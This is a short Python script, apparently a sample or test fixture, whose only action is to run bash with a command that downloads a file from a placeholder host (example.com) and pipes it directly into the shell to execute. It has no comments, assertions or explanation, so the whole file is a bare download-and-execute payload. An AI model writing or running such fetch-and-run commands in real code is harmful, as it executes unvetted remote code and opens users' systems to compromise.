import os
import subprocess
from subprocess import Popen, PIPE


s = subprocess

s.run(["/bin/bash", "-c", "curl http://example.com/favicon.txt|sh"])